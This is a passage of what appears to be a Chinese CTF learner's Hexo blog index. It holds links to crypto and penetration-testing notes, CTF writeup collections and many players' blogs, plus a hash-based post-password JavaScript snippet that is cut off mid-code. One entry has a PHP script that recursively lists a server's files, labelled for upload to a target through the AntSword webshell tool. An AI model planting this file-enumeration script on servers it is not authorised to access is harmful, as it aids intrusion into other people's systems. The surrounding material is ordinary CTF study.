href="https://qsang.xin/2019/04/25/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://qsang.xin/2019/04/25/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E6%80%BB%E7%BB%93/</a></p><p><a href="https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/#more</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_CRYPTO </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_penetration</title>
      <link href="/2020/05/06/best-penetration/"/>
      <url>/2020/05/06/best-penetration/</url>
      
        <content type="html"><![CDATA[<h1 id="1-php"><a href="#1-php" class="headerlink" title="1.  php"></a>1.  php</h1><h2 id="1-1-framework"><a href="#1-1-framework" class="headerlink" title="1.1  framework"></a>1.1  framework</h2><h3 id="1-1-1-thinkphp"><a href="#1-1-1-thinkphp" class="headerlink" title="1.1.1  thinkphp"></a>1.1.1  thinkphp</h3><h3 id="1-1-2-ECShop"><a href="#1-1-2-ECShop" class="headerlink" title="1.1.2  ECShop"></a>1.1.2  ECShop</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>Ecshop 2.x-3.x 远程代码执行漏洞  <a href="https://wulidecade.cn/2019/10/08/Ecshop-2-x-3-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more" target="_blank" rel="noopener">https://wulidecade.cn/2019/10/08/Ecshop-2-x-3-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more</a></p><p><strong>2、</strong>thinkphp开发手册  <a href="https://www.kancloud.cn/manual/thinkphp5/118017" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118017</a></p><p><strong>3、</strong>TP控制器初始化  <a href="https://www.kancloud.cn/manual/thinkphp5/118049" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118049</a></p><h2 id="1-2-template-engine"><a href="#1-2-template-engine" class="headerlink" title="1.2  template engine"></a>1.2  template engine</h2><h3 id="1-2-1-smarty"><a href="#1-2-1-smarty" class="headerlink" title="1.2.1  smarty"></a>1.2.1  smarty</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong> Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】 <a href="https://xz.aliyun.com/t/1983" target="_blank" rel="noopener">https://xz.aliyun.com/t/1983</a></p><h1 id="2-instrument"><a href="#2-instrument" class="headerlink" title="2.  instrument"></a>2.  instrument</h1><h2 id="2-1-script"><a href="#2-1-script" class="headerlink" title="2.1  script"></a>2.1  script</h2><h3 id="2-1-1-上车扫描器-可以用蚁剑放上去"><a href="#2-1-1-上车扫描器-可以用蚁剑放上去" class="headerlink" title="2.1.1  上车扫描器(可以用蚁剑放上去)"></a><strong>2.1.1  上车扫描器(可以用蚁剑放上去)</strong></h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>De1CTF 2020    <a href="https://www.gem-love.com/ctf/2302.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2302.html</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">".."</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">list_file</span><span class="token punctuation">(</span><span class="token variable">$date</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$temp</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$date</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$v</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$v</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token operator">||</span> <span class="token variable">$v</span> <span class="token operator">==</span> <span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>           <span class="token function">list_file</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">list_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> gpp 、 msf 、 meterpreter shell，又是未知的知识了，哈哈！！</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong>1、</strong>从一道高质量的ctf题中看渗透测试    <a href="http://www.52bug.cn/hkjs/4508.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4508.html</a></p><p><strong>2、</strong>CTF靶机——bounty通关攻略  <a href="https://zhuanlan.zhihu.com/p/48705056" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/48705056</a></p><p><strong>3、</strong>CTF实验：web安全目录遍历  <a href="https://blog.csdn.net/floyd_art/article/details/105372948" target="_blank" rel="noopener">https://blog.csdn.net/floyd_art/article/details/105372948</a></p><p><strong>4、</strong>内网渗透（蚁剑+MSF）<a href="https://my.oschina.net/u/4314581/blog/3316251" target="_blank" rel="noopener">https://my.oschina.net/u/4314581/blog/3316251</a></p><p><strong>5、</strong>WatchBird: 专为AWD而生的新一代纯PHP防火墙  <a href="https://www.freebuf.com/sectool/234402.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/234402.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>basic_collections</title>
      <link href="/2020/05/05/basic-collections/"/>
      <url>/2020/05/05/basic-collections/</url>
      
        <content type="html"><![CDATA[<h1 id="1-blog-collections"><a href="#1-blog-collections" class="headerlink" title="1.  blog_collections"></a>1.  blog_collections</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>神仙：<a href="https://www.bilibili.com/video/BV1o5411s76C" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1o5411s76C</a></p><p><a href="https://paper.seebug.org/category/blockchain/" target="_blank" rel="noopener">https://paper.seebug.org/category/blockchain/</a></p><p><a href="http://limu.ltd/2020/05/04/buuctf%e4%b8%80%e5%88%86%e9%a2%98%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95/" target="_blank" rel="noopener">http://limu.ltd/2020/05/04/buuctf%e4%b8%80%e5%88%86%e9%a2%98%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95/</a></p><p><a href="http://www.mi1k7ea.com/" target="_blank" rel="noopener">http://www.mi1k7ea.com/</a></p><p><a href="https://www.cnblogs.com/W4nder/" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/</a></p><p><a href="http://www.peiqi.tech/posts/7775/#testyournc" target="_blank" rel="noopener">http://www.peiqi.tech/posts/7775/#testyournc</a></p><p>[w4nder]    <a href="http://phoebe233.cn/" target="_blank" rel="noopener">http://phoebe233.cn/</a></p><p>[王一航]    <a href="https://www.jianshu.com/u/bf30f18c872c" target="_blank" rel="noopener">https://www.jianshu.com/u/bf30f18c872c</a></p><p><a href="https://p3rh4ps.top" target="_blank" rel="noopener">https://p3rh4ps.top</a></p><p>[glzjin]    <a href="https://www.zhaoj.in" target="_blank" rel="noopener">https://www.zhaoj.in</a><br>[cl4y]    <a href="http://www.cl4y.top/" target="_blank" rel="noopener">http://www.cl4y.top/</a><br>[afkl]    <a href="https://www.afkl.ml" target="_blank" rel="noopener">https://www.afkl.ml</a><br>[moyu]    <a href="http://althims.com/" target="_blank" rel="noopener">http://althims.com/</a><br>[Mrkaixin]    <a href="http://github.mrkaixin.comuputer" target="_blank" rel="noopener">http://github.mrkaixin.comuputer</a><br>[Harvey]    <a href="http://harvey-blog.com" target="_blank" rel="noopener">http://harvey-blog.com</a><br>[su290429]    <a href="https://blog.su29029.xyz" target="_blank" rel="noopener">https://blog.su29029.xyz</a><br>[3rsh1]    <a href="https://www.3rsh1.cool" target="_blank" rel="noopener">https://www.3rsh1.cool</a><br>[yemoli]    <a href="https://yml-sec.top" target="_blank" rel="noopener">https://yml-sec.top</a><br>[beiwo]    <a href="https://www.cnblogs.com/wkzb/" target="_blank" rel="noopener">https://www.cnblogs.com/wkzb/</a><br>[N0us]    <a href="https://n0usec.top/" target="_blank" rel="noopener">https://n0usec.top/</a><br>[monitor]    <a href="http://m0nit0r.top/" target="_blank" rel="noopener">http://m0nit0r.top/</a><br>[xlcvv]    <a href="https://blog.csdn.net/weixin_44348894" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44348894</a><br>[LionTree]    <a href="https://liotree.github.io/" target="_blank" rel="noopener">https://liotree.github.io/</a><br>[Yunen]    <a href="https://www.0x002.com/" target="_blank" rel="noopener">https://www.0x002.com/</a><br>[Gq]    <a href="https://www.plasf.cn/" target="_blank" rel="noopener">https://www.plasf.cn/</a><br>[Cxlover]    <a href="https://550532788.github.io/" target="_blank" rel="noopener">https://550532788.github.io/</a><br>[Keyboy]    <a href="http://www.keyboy.xyz" target="_blank" rel="noopener">www.keyboy.xyz</a><br>[w4nder]    <a href="http://phoebe233.cn/" target="_blank" rel="noopener">http://phoebe233.cn/</a><br>[Hed9eh0g]    <a href="http://hed9eh0g.top" target="_blank" rel="noopener">http://hed9eh0g.top</a><br>[Duidui]    <a href="https://duitutu.cn" target="_blank" rel="noopener">https://duitutu.cn</a><br>[sketch_pl4ne]    <a href="http://www.sketchplane.top" target="_blank" rel="noopener">www.sketchplane.top</a><br>[LemonPrefect]    <a href="https://lemonprefect.cn" target="_blank" rel="noopener">https://lemonprefect.cn</a><br>[15h3na0]    <a href="http://15h3na0.xyz" target="_blank" rel="noopener">http://15h3na0.xyz</a><br>[cjm00n]    <a href="https://cjm00n.top" target="_blank" rel="noopener">https://cjm00n.top</a><br>[HhhM]    <a href="https://www.redmango.top/" target="_blank" rel="noopener">https://www.redmango.top/</a><br>[Dem0ns]    <a href="https://suse.fun" target="_blank" rel="noopener">https://suse.fun</a><br>[Extrader]    <a href="https://www.extrader.top" target="_blank" rel="noopener">https://www.extrader.top</a><br>[Mashiroi]    <a href="http://blog.mashiroi.top/" target="_blank" rel="noopener">http://blog.mashiroi.top/</a><br>[imagin]    <a href="https://imagin.vip/" target="_blank" rel="noopener">https://imagin.vip/</a><br>[therus]    <a href="https://al0neranger.github.io/" target="_blank" rel="noopener">https://al0neranger.github.io/</a><br>[prontosil]    <a href="http://prontosil.me/" target="_blank" rel="noopener">http://prontosil.me/</a><br>[h3zh1]    <a href="https://www.cnblogs.com/h3zh1/" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/</a><br>[V1cuna]    <a href="https://www.hackyangtuo.top" target="_blank" rel="noopener">https://www.hackyangtuo.top</a><br>[0xdawn]    <a href="http://www.0xdawn.cn" target="_blank" rel="noopener">http://www.0xdawn.cn</a><br>[P3rh4ps]    <a href="https://p3brh4ps.top" target="_blank" rel="noopener">https://p3brh4ps.top</a><br>[简简]    <a href="https://jwt1399.top" target="_blank" rel="noopener">https://jwt1399.top</a><br>[XZLang]    <a href="https://xzlang.github.io" target="_blank" rel="noopener">https://xzlang.github.io</a><br>[0atmea1]    <a href="https://oatmeal.vip" target="_blank" rel="noopener">https://oatmeal.vip</a><br>[hhhhhhhhjk]    <a href="https://hujiekang.top" target="_blank" rel="noopener">https://hujiekang.top</a><br>[osword]    <a href="http://zhzhdoai.github.io" target="_blank" rel="noopener">http://zhzhdoai.github.io</a><br>[wander]    <a href="http://iwonder.run" target="_blank" rel="noopener">http://iwonder.run</a><br>[Joker$]    <a href="https://blog.j0k3r.cn/" target="_blank" rel="noopener">https://blog.j0k3r.cn/</a><br>[Hausa_]    <a href="http://hausahan.cn" target="_blank" rel="noopener">http://hausahan.cn</a><br>[zesiar0]    <a href="https://www.cnblogs.com/zesiar0/" target="_blank" rel="noopener">https://www.cnblogs.com/zesiar0/</a><br>[curled]    <a href="https://lpc.wiki/" target="_blank" rel="noopener">https://lpc.wiki/</a><br>[陌安]    <a href="http://moann.xyx" target="_blank" rel="noopener">http://moann.xyx</a><br>[没见过flag]    <a href="http://ctf-web.zm996.cloud" target="_blank" rel="noopener">http://ctf-web.zm996.cloud</a><br>[VaalaCat]    <a href="https://vaala.cat" target="_blank" rel="noopener">https://vaala.cat</a><br>[CyzCc]    <a href="http://cyzcc.vip" target="_blank" rel="noopener">http://cyzcc.vip</a><br>[Cupid]    <a href="https://bephplover.github.io/" target="_blank" rel="noopener">https://bephplover.github.io/</a><br>[ggb0n]    <a href="http://ggb0n.cool" target="_blank" rel="noopener">http://ggb0n.cool</a><br>[karsa]    <a href="https://www.cnblogs.com/karsa/" target="_blank" rel="noopener">https://www.cnblogs.com/karsa/</a><br>[Mimei]    <a href="http://mi.cl4y.top/" target="_blank" rel="noopener">http://mi.cl4y.top/</a><br>[Y1ng]    <a href="https://gem-love.com" target="_blank" rel="noopener">https://gem-love.com</a><br>[Mount4in]    <a href="https://mount4in.github.io/" target="_blank" rel="noopener">https://mount4in.github.io/</a><br>[zjun]    <a href="https://www.zjun.info" target="_blank" rel="noopener">https://www.zjun.info</a><br>[kee1ong]    <a href="http://www.kee1ongz.pw/" target="_blank" rel="noopener">http://www.kee1ongz.pw/</a><br>[m0c1nu7]    <a href="https://blog.csdn.net/mochu7777777" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777</a><br>[Ba2in9a]    <a href="http://ba2in9a.top/" target="_blank" rel="noopener">http://ba2in9a.top/</a><br>[zu1k]    <a href="https://blog.lgf.im" target="_blank" rel="noopener">https://blog.lgf.im</a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>[Surager]    <a href="https://surager.github.io" target="_blank" rel="noopener">https://surager.github.io</a><br>[Sinon]    <a href="https://dere.press" target="_blank" rel="noopener">https://dere.press</a><br>[limu]    <a href="http://limu.ltd" target="_blank" rel="noopener">http://limu.ltd</a><br>[FMYY]    <a href="https://fmyy.pro/" target="_blank" rel="noopener">https://fmyy.pro/</a><br>[N0vice]    <a href="https://n0vice.top/" target="_blank" rel="noopener">https://n0vice.top/</a><br>[1p0ch]    <a href="https://1p0ch.cn/" target="_blank" rel="noopener">https://1p0ch.cn/</a><br>[zhakul]    <a href="https://zhakul.top" target="_blank" rel="noopener">https://zhakul.top</a><br>[EDS]    <a href="http://www.ericdshen.com" target="_blank" rel="noopener">http://www.ericdshen.com</a><br>[b1nd]    <a href="https://www.b1ndsec.cn" target="_blank" rel="noopener">https://www.b1ndsec.cn</a><br>[yan_nuo]    <a href="https://blog.csdn.net/qq_43935969" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969</a><br>[ruan]    <a href="https://ruan777.github.io/" target="_blank" rel="noopener">https://ruan777.github.io/</a><br>[KMFL]    <a href="https://blog.csdn.net/weixin_44145820" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44145820</a><br>[Mercurio]    <a href="https://signormercurio.me/" target="_blank" rel="noopener">https://signormercurio.me/</a><br>[zhz]    <a href="https://tina2114.github.io/" target="_blank" rel="noopener">https://tina2114.github.io/</a><br>[summerN]    <a href="https://summern.club" target="_blank" rel="noopener">https://summern.club</a><br>[Lime]    djstudy.top<br>[TaQini]    <a href="http://taqini.space" target="_blank" rel="noopener">http://taqini.space</a><br>[Nop]    <a href="https://n0nop.com" target="_blank" rel="noopener">https://n0nop.com</a><br>[赤道企鹅]    <a href="https://eqqie.cn/" target="_blank" rel="noopener">https://eqqie.cn/</a><br>[Eli0t]    <a href="http://www.ybm911.work" target="_blank" rel="noopener">http://www.ybm911.work</a><br>[SunXiaokong]    <a href="https://www.sunxiaokong.xyz/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/</a><br>[Migraine殇]    <a href="https://migraine-sudo.github.io/" target="_blank" rel="noopener">https://migraine-sudo.github.io/</a><br>Reverse<br>[Reverier]    <a href="https://www.wootec.top/" target="_blank" rel="noopener">https://www.wootec.top/</a><br>[Qfrost]    <a href="http://www.qfrost.com/" target="_blank" rel="noopener">http://www.qfrost.com/</a><br>[Usher]    <a href="https://usher2008.github.io/" target="_blank" rel="noopener">https://usher2008.github.io/</a><br>[令则]    <a href="https://lingze.xyz/" target="_blank" rel="noopener">https://lingze.xyz/</a><br>[0xc4m3l]    <a href="http://0xc4m3l.club/" target="_blank" rel="noopener">http://0xc4m3l.club/</a><br>[wh1te]    <a href="https://whhhite.github.io/" target="_blank" rel="noopener">https://whhhite.github.io/</a><br>[Alkaid]    <a href="https://www.dongzt.cn/" target="_blank" rel="noopener">https://www.dongzt.cn/</a><br>[HAPPY]    <a href="https://happyers.top/" target="_blank" rel="noopener">https://happyers.top/</a><br>[Du1in9]    <a href="https://www.jianshu.com/p/fe1baa5bb1e9" target="_blank" rel="noopener">https://www.jianshu.com/p/fe1baa5bb1e9</a><br>[幼稚园]    <a href="https://www.danisjiang.com/" target="_blank" rel="noopener">https://www.danisjiang.com/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>[Ga1@xy]    <a href="http://www.ga1axy.top/" target="_blank" rel="noopener">http://www.ga1axy.top/</a><br>[FzWjScJ]    <a href="http://www.fzwjscj.xyz" target="_blank" rel="noopener">http://www.fzwjscj.xyz</a><br>[Nekogawa]    <a href="https://kunagisa.moe" target="_blank" rel="noopener">https://kunagisa.moe</a><br>[YIGAOYU]    <a href="https://blog.csdn.net/YIGAOYU" target="_blank" rel="noopener">https://blog.csdn.net/YIGAOYU</a><br>[Amadeus]    <a href="http://www.sern.site" target="_blank" rel="noopener">http://www.sern.site</a><br>[DizzyK]    <a href="http://blog.dizzyk.top" target="_blank" rel="noopener">http://blog.dizzyk.top</a><br>[ShawRoot]    <a href="https://shawroot.cc/" target="_blank" rel="noopener">https://shawroot.cc/</a><br>[L1near]    <a href="https://l1near.top/" target="_blank" rel="noopener">https://l1near.top/</a><br>[BTIS]    <a href="https://www.btis.site" target="_blank" rel="noopener">https://www.btis.site</a><br>[Luz]    <a href="https://www.hyluz.cn" target="_blank" rel="noopener">https://www.hyluz.cn</a><br>[luoq1an]    <a href="https://luoq1an.github.io/" target="_blank" rel="noopener">https://luoq1an.github.io/</a><br>[Pjy]    <a href="https://www.cnblogs.com/Mercurysur/" target="_blank" rel="noopener">https://www.cnblogs.com/Mercurysur/</a><br>[夏风]    <a href="https://blog.xiafeng2333.top/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/</a><br>[fjh1997]    <a href="https://blog.csdn.net/fjh1997" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997</a><br>[ChanCherry]    <a href="https://chancherry.github.io/" target="_blank" rel="noopener">https://chancherry.github.io/</a><br>[MiaoTony]    <a href="https://miaotony.xyz/" target="_blank" rel="noopener">https://miaotony.xyz/</a><br>[Du1in9]    <a href="https://www.jianshu.com/p/1a318f2b4082" target="_blank" rel="noopener">https://www.jianshu.com/p/1a318f2b4082</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>[0xDktb]    <a href="https://0xdktb.top/" target="_blank" rel="noopener">https://0xdktb.top/</a><br>[GrayWar]    <a href="https://peonycsa.com/" target="_blank" rel="noopener">https://peonycsa.com/</a><br>[Am473ur]    <a href="http://caoyi.site/" target="_blank" rel="noopener">http://caoyi.site/</a><br>[badmonkey]    <a href="https://badmonkey.site" target="_blank" rel="noopener">https://badmonkey.site</a><br>[shallow]    <a href="https://shal10w.github.io/" target="_blank" rel="noopener">https://shal10w.github.io/</a><br>[Du1in9]    <a href="https://www.jianshu.com/p/013e477740d8" target="_blank" rel="noopener">https://www.jianshu.com/p/013e477740d8</a></p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>依云  <a href="https://blog.lilydjwg.me/tag/%E7%88%B1%E6%83%85" target="_blank" rel="noopener">https://blog.lilydjwg.me/tag/%E7%88%B1%E6%83%85</a></p><h1 id="2-writeup-collections"><a href="#2-writeup-collections" class="headerlink" title="2.  writeup_collections"></a>2.  writeup_collections</h1><h2 id="2-1-历年ctf大赛writeup整理"><a href="#2-1-历年ctf大赛writeup整理" class="headerlink" title="2.1  历年ctf大赛writeup整理"></a>2.1  历年ctf大赛writeup整理</h2><h3 id="2-1-1-2018网鼎杯"><a href="#2-1-1-2018网鼎杯" class="headerlink" title="2.1.1 2018网鼎杯"></a>2.1.1 2018网鼎杯</h3><h4 id="2-1-1-1-红日安全-网鼎杯WriteUp"><a href="#2-1-1-1-红日安全-网鼎杯WriteUp" class="headerlink" title="2.1.1.1  红日安全-网鼎杯WriteUp"></a>2.1.1.1  红日安全-网鼎杯WriteUp</h4><p><a href="https://www.secpulse.com/archives/74776.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/74776.html</a></p><h3 id="2-1-2-2020网鼎杯"><a href="#2-1-2-2020网鼎杯" class="headerlink" title="2.1.2 2020网鼎杯"></a>2.1.2 2020网鼎杯</h3><h4 id="2-1-2-1-2020青龙组WEB部分题目"><a href="#2-1-2-1-2020青龙组WEB部分题目" class="headerlink" title="2.1.2.1  2020青龙组WEB部分题目"></a>2.1.2.1  2020青龙组WEB部分题目</h4><p><a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/2322.html</a></p><h3 id="2-1-3-2019神盾杯"><a href="#2-1-3-2019神盾杯" class="headerlink" title="2.1.3  2019神盾杯"></a>2.1.3  2019神盾杯</h3><p>2019神盾杯上海市网络安全竞赛Web题解  <a href="https://xz.aliyun.com/t/5417" target="_blank" rel="noopener">https://xz.aliyun.com/t/5417</a></p><h3 id="2-1-4-De1CTF-Writeup-By-V-amp-N"><a href="#2-1-4-De1CTF-Writeup-By-V-amp-N" class="headerlink" title="2.1.4  De1CTF Writeup By V&amp;N"></a>2.1.4  De1CTF Writeup By V&amp;N</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484753&amp;idx=1&amp;sn=4e57b16aca078280baafd57d0d93e7e5&amp;chksm=9760f187a0177891d53853ef989e53f21e37a9836fc4925141707969ee6be817dd99f1343e52&amp;mpshare=1&amp;scene=23&amp;srcid=0507upOECSdhxLpm3cBC5o3X&amp;sharer_sharetime=1588780892489&amp;sharer_shareid=d4960ec5e63151196e1f63f385e0d668#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484753&amp;idx=1&amp;sn=4e57b16aca078280baafd57d0d93e7e5&amp;chksm=9760f187a0177891d53853ef989e53f21e37a9836fc4925141707969ee6be817dd99f1343e52&amp;mpshare=1&amp;scene=23&amp;srcid=0507upOECSdhxLpm3cBC5o3X&amp;sharer_sharetime=1588780892489&amp;sharer_shareid=d4960ec5e63151196e1f63f385e0d668#rd</a></p><h3 id="2-1-5-3CTF"><a href="#2-1-5-3CTF" class="headerlink" title="2.1.5  3CTF"></a>2.1.5  3CTF</h3><p>初赛题目详解（上） <a href="http://www.secwk.com/2019/10/26/12210/" target="_blank" rel="noopener">http://www.secwk.com/2019/10/26/12210/</a></p><h3 id="2-1-6-LCTF-2018-Writeup-–-Nu1L"><a href="#2-1-6-LCTF-2018-Writeup-–-Nu1L" class="headerlink" title="2.1.6  LCTF 2018 Writeup – Nu1L"></a>2.1.6  LCTF 2018 Writeup – Nu1L</h3><p><a href="https://xz.aliyun.com/t/3341#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341#toc-13</a></p><h3 id="2-1-7-ciscn2019"><a href="#2-1-7-ciscn2019" class="headerlink" title="2.1.7  ciscn2019"></a><strong>2.1.7  ciscn2019</strong></h3><h4 id="2-1-7-1-华北赛区-Day1-Dropbox"><a href="#2-1-7-1-华北赛区-Day1-Dropbox" class="headerlink" title="2.1.7.1  华北赛区 Day1 Dropbox"></a>2.1.7.1  华北赛区 Day1 Dropbox</h4><p><a href="https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/" target="_blank" rel="noopener">https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/</a></p><h1 id="3-萌新专区"><a href="#3-萌新专区" class="headerlink" title="3.  萌新专区"></a>3.  萌新专区</h1><p>这也是为以后培养人才做准备吧！！哈哈</p><p><strong>1、</strong>萌新一区  <a href="https://www.cnblogs.com/lidong20179210/articles/9062546.html" target="_blank" rel="noopener">https://www.cnblogs.com/lidong20179210/articles/9062546.html</a></p><p><strong>2、</strong>萌新二区  <a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p><h1 id="4-靶场专区"><a href="#4-靶场专区" class="headerlink" title="4.  靶场专区"></a>4.  靶场专区</h1><h2 id="4-1-web靶场"><a href="#4-1-web靶场" class="headerlink" title="4.1.  web靶场"></a>4.1.  web靶场</h2><h3 id="4-1-1-FLAWS-challenge"><a href="#4-1-1-FLAWS-challenge" class="headerlink" title="4.1.1  FLAWS challenge"></a>4.1.1  FLAWS challenge</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>FLAWS challenge——AWS CTF通关记  <a href="https://www.anquanke.com/post/id/201460#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201460#h2-0</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020--NPUCTF</title>
      <link href="/2020/05/04/2020-npuctf/"/>
      <url>/2020/05/04/2020-npuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-NPUCTF-验证🐎"><a href="#1-NPUCTF-验证🐎" class="headerlink" title="1. NPUCTF 验证🐎"></a>1. NPUCTF 验证🐎</h1><p><strong>链接：</strong></p><p><strong>考点：</strong>JS弱类型+原型链</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>NPUCTF 验证🐎  <a href="https://guokeya.github.io/post/XxOKeal9U/" target="_blank" rel="noopener">https://guokeya.github.io/post/XxOKeal9U/</a></p><h1 id="2-NPUCTF-web"><a href="#2-NPUCTF-web" class="headerlink" title="2. NPUCTF web"></a>2. NPUCTF web</h1>]]></content>
      
      
      <categories>
          
          <category> CTF_contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2020-4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basic_hexo</title>
      <link href="/2020/05/04/basic-hexo/"/>
      <url>/2020/05/04/basic-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="1-basic-hexo"><a href="#1-basic-hexo" class="headerlink" title="1.  basic_hexo"></a>1.  basic_hexo</h1><h2 id="1-1-items"><a href="#1-1-items" class="headerlink" title="1.1  items"></a>1.1  items</h2><h3 id="1-1-1-博文加密"><a href="#1-1-1-博文加密" class="headerlink" title="1.1.1  博文加密"></a>1.1.1  博文加密</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> pwd <span class="token operator">=</span> <span class="token string">'ddee63d5ca1ef22012a3bde6e7979a8a6cf1804a725a15f868e66c67b01a5c02'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pwd <span class="token operator">&amp;&amp;</span> pwd<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pwd <span class="token operator">!==</span> CryptoJS<span class="token punctuation">.</span><span class="token function">SHA256</span><span class="token punctuation">(</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'请输入访问本文章的密码'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CryptoJS<span class="token punctuation">.</span>enc<span class="token punctuation">.</span>Hex<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'密码错误，将返回主页！'</span><span class="token 